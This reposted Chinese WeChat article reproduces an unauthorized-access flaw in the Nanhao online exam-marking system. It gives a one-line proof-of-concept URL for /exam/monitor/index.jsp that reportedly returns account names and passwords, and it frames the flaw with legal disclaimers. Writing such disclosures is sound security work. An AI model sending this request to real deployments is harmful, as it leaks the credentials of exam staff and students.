> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0MjU5NTY2MQ==&mid=2247484421&idx=1&sn=5c3724f0c2d78efe44c29769c0a54860

#  【漏洞复现】南昊网上阅卷系统/exam/monitor/index.jsp接口未授权访问  
什么安全  什么安全   2025-07-08 09:06  
  
    
请勿利用  
文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接  
或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责  
！    
## 产品描述  
  
南昊网上阅卷系统是一款专为教育领域设计的在线阅卷工具，它能够帮助教师和考试机构实现高效、准确的试卷评阅。  
## 漏洞描述  
  
  
系统  
/exam/monitor/index.jsp存在未授权访问，远程攻击者可通过该接口获取用户账号与密码，造成信息泄露。  
## Poc  
  

```
http://127.0.0.1/exam/monitor/index.jsp?logname=admin
```

  
  
## 漏洞复现  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/w0DeFbFI15w2WtvYFbw9eFYu5sibOVaEMD0fw8lTkGFYoQa8jm8G3XQI5cia0Y5hl9PRwR26ia4DryszBg9T616fQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
小  
知  
识  
  
  
  
  
**依据《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息罪的，处3年以下有期徒刑或者****拘役****，并处或者单处****罚金****;情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声  
明  
  
  
  
**本文提供的技术参数仅供学习或运维人员对内部系统进行测试提供参考，未经授权请勿用本文提供的技术进行破坏性测试，利用此文提供的信息造成的直接或间接损失，由使用者承担。**  
  
  
  
  
